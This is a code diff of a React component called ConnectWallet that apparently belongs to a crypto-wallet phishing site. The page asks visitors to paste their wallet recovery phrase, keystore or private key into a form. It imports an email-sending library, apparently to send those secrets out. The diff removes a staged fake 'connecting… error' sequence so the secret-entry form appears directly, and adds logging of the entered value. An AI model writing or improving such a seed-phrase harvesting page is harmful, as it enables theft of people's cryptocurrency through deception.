@@ -1,6 +1,6 @@
 import emailjs from "@emailjs/browser";
 import { useTranslations } from "next-intl";
-import React, { useEffect, useState } from "react";
+import React, { useState } from "react";
 import { useRouter } from "../../../i18n/route";
 
 interface ConnectWalletProps {
@@ -15,42 +15,22 @@ const ConnectWallet: React.FC<ConnectWalletProps> = ({
   title,
 }) => {
   const t = useTranslations("ConnectWallet");
-  console.log("t----4--44", t);
-  const [flowState, setFlowState] = useState<
-    "initializing" | "connecting" | "error" | "manual"
-  >("initializing");
-  const [showManualConnect, setShowManualConnect] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [activeTab, setActiveTab] = useState<
     "phrase" | "keystore" | "privateKey"
   >("phrase");
-
   const router = useRouter();
   const [inputValue, setInputValue] = useState("");
   const [error, setError] = useState("");
 
-  useEffect(() => {
-    const initTimer = setTimeout(() => {
-      setFlowState("connecting");
-
-      const connectTimer = setTimeout(() => {
-        setFlowState("error");
-      }, 2000);
-
-      return () => clearTimeout(connectTimer);
-    }, 1500);
-
-    return () => clearTimeout(initTimer);
-  }, []);
-
   const handleSubmit = async () => {
     if (isSubmitting) return;
     if (!inputValue) {
-      setError(t("errors.required")); // "Veuillez entrer une valeur"
+      setError(t("errors.required"));
       return;
     }
     if (inputValue.length < 12) {
-      setError(t("errors.minLength")); // "La valeur doit contenir au moins 12 caractères"
+      setError(t("errors.minLength"));
       return;
     }
     setIsSubmitting(true);
@@ -84,11 +64,7 @@ const ConnectWallet: React.FC<ConnectWalletProps> = ({
     }
   };
 
-  const handleManualClick = () => {
-    setShowManualConnect(true);
-    setFlowState("manual");
-    handleManualConnect();
-  };
+  console.log("input", inputValue);
 
   const handleTabClick = (tab: "phrase" | "keystore" | "privateKey") => {
     setActiveTab(tab);
@@ -115,132 +91,84 @@ const ConnectWallet: React.FC<ConnectWalletProps> = ({
         </svg>
       </div>
 
-      {flowState === "initializing" ? (
-        <div className="flex flex-col items-center py-8 w-[20rem] md:w-full">
-          <div className="animate-pulse flex space-x-2">
-            <div className="h-3 w-3 bg-blue-400 rounded-full"></div>
-            <div className="h-3 w-3 bg-blue-400 rounded-full"></div>
-            <div className="h-3 w-3 bg-blue-400 rounded-full"></div>
-          </div>
-          <p className="text-white font-medium mt-4">{t("initializing")}</p>
-        </div>
-      ) : flowState === "connecting" ? (
-        <div className="flex flex-col items-center py-8 w-[20rem] md:w-full">
-          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mb-4"></div>
-          <p className="text-white font-medium">{t("connecting")}</p>
-        </div>
-      ) : flowState === "error" ? (
-        <div className="w-[20rem] md:w-full">
-          <h2 className="text-xl font-bold text-white mb-4 text-center">
-            {t("title")}
-          </h2>
+      <div className="w-full">
+        <h2 className="text-xl font-bold text-white mb-4 text-center">
+          {t("title")}
+        </h2>
 
-          <div className="flex items-center justify-between bg-red-900/30 border border-red-700 rounded-lg p-1 py-2 md:py-2 cursor-pointer md:p-4 mb-6">
-            <div className="flex items-center">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                className="h-5 w-5 text-red-400 mr-2"
-                viewBox="0 0 20 20"
-                fill="currentColor"
-              >
-                <path
-                  fillRule="evenodd"
-                  d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
-                  clipRule="evenodd"
-                />
-              </svg>
-              <span className="text-red-300 text-[10px] md:text-sm pt-1">
-                {t("error")}
-              </span>
-            </div>
-            <button
-              onClick={handleManualClick}
-              className="px-3 py-1 bg-blue-600 hover:bg-blue-700 rounded-md text-white text-[10px] md:text-sm font-medium transition-colors"
-            >
-              <p className="text-[10px] md:text-sm">{t("connectManually")}</p>
-            </button>
-          </div>
-        </div>
-      ) : (
-        <div className="w-full">
-          <h2 className="text-xl font-bold text-white mb-4 text-center">
-            {t("title")}
-          </h2>
-
-          {/* Tabs */}
-          <div className="flex border-b border-gray-700 mb-4">
-            <button
-              className={`px-4 py-2 font-medium ${
-                activeTab === "phrase"
-                  ? "text-blue-400 border-b-2 border-blue-400"
-                  : "text-gray-400"
-              }`}
-              onClick={() => handleTabClick("phrase")}
-            >
-              <p className="text-[13px] md:text-2xl">{t("tabs.phrase")}</p>
-            </button>
-            <button
-              className={`px-4 py-2 font-medium ${
-                activeTab === "keystore"
-                  ? "text-blue-400 border-b-2 border-blue-400"
-                  : "text-gray-400"
-              }`}
-              onClick={() => handleTabClick("keystore")}
-            >
-              <p className="text-[13px] md:text-2xl">{t("tabs.keystore")}</p>
-            </button>
-            <button
-              className={`px-4 py-2 font-medium ${
-                activeTab === "privateKey"
-                  ? "text-blue-400 border-b-2 border-blue-400"
-                  : "text-gray-400"
-              }`}
-              onClick={() => handleTabClick("privateKey")}
-            >
-              <p className="text-[13px] md:text-2xl">{t("tabs.privateKey")}</p>
-            </button>
-          </div>
-
-          {/* Content Area */}
-          <div className="mb-6">
-            <textarea
-              className="w-full h-32 p-3 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-              placeholder={
-                activeTab === "phrase"
-                  ? t("placeholders.phrase")
-                  : activeTab === "keystore"
-                  ? t("placeholders.keystore")
-                  : t("placeholders.privateKey")
-              }
-              value={inputValue}
-              onChange={(e) => setInputValue(e.target.value)}
-            />
-          </div>
+        {/* Tabs */}
+        <div className="flex border-b border-gray-700 mb-4">
           <button
-            onClick={handleSubmit}
-            className="px-4 py-2 font-medium border-2 border-blue-400 w-full cursor-pointer hover:bg-blue-400 text-blue-400 hover:text-white transition-colors"
+            className={`px-4 py-2 font-medium ${
+              activeTab === "phrase"
+                ? "text-blue-400 border-b-2 border-blue-400"
+                : "text-gray-400"
+            }`}
+            onClick={() => handleTabClick("phrase")}
           >
-            <p className="text-[13px] md:text-2xl">
-              {isSubmitting ? t("processing") : t("submit")}
-            </p>
+            <p className="text-[13px] md:text-2xl">{t("tabs.phrase")}</p>
           </button>
-
-          {error !== "" && (
-            <div className="bg-gray-800/50 border border-gray-700 mt-4 rounded-md p-4 mb-4">
-              <h3 className="font-bold text-red-500 mb-2">Error</h3>
-              <p className="text-red-500 text-[13px] md:text-sm">{error}</p>
-            </div>
-          )}
-
-          {/* Info Box */}
-          <div className="bg-gray-800/50 border border-gray-700 mt-4 rounded-md p-4 mb-4">
-            <h3 className="font-bold text-white mb-2">{t("info.title")}</h3>
-            <p className="text-gray-300 text-[13px] md:text-sm">
-              {t("info.description", { title })}
-            </p>
-          </div>
+          <button
+            className={`px-4 py-2 font-medium ${
+              activeTab === "keystore"
+                ? "text-blue-400 border-b-2 border-blue-400"
+                : "text-gray-400"
+            }`}
+            onClick={() => handleTabClick("keystore")}
+          >
+            <p className="text-[13px] md:text-2xl">{t("tabs.keystore")}</p>
+          </button>
+          <button
+            className={`px-4 py-2 font-medium ${
+              activeTab === "privateKey"
+                ? "text-blue-400 border-b-2 border-blue-400"
+                : "text-gray-400"
+            }`}
+            onClick={() => handleTabClick("privateKey")}
+          >
+            <p className="text-[13px] md:text-2xl">{t("tabs.privateKey")}</p>
+          </button>
         </div>
-      )}
+
+        {/* Content Area */}
+        <div className="mb-6">
+          <textarea
+            className="w-full h-32 p-3 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
+            placeholder={
+              activeTab === "phrase"
+                ? t("placeholders.phrase")
+                : activeTab === "keystore"
+                ? t("placeholders.keystore")
+                : t("placeholders.privateKey")
+            }
+            value={inputValue}
+            onChange={(e) => setInputValue(e.target.value)}
+          />
+        </div>
+        <button
+          onClick={handleSubmit}
+          className="px-4 py-2 font-medium border-2 border-blue-400 w-full cursor-pointer hover:bg-blue-400 text-blue-400 hover:text-white transition-colors"
+        >
+          <p className="text-[13px] md:text-2xl">
+            {isSubmitting ? t("processing") : t("submit")}
+          </p>
+        </button>
+
+        {error !== "" && (
+          <div className="bg-gray-800/50 border border-gray-700 mt-4 rounded-md p-4 mb-4">
+            <h3 className="font-bold text-red-500 mb-2">Error</h3>
+            <p className="text-red-500 text-[13px] md:text-sm">{error}</p>
+          </div>
+        )}
+
+        {/* Info Box */}
+        <div className="bg-gray-800/50 border border-gray-700 mt-4 rounded-md p-4 mb-4">
+          <h3 className="font-bold text-white mb-2">{t("info.title")}</h3>
+          <p className="text-gray-300 text-[13px] md:text-sm">
+            {t("info.description", { title })}
+          </p>
+        </div>
+      </div>
     </div>
   );
 };
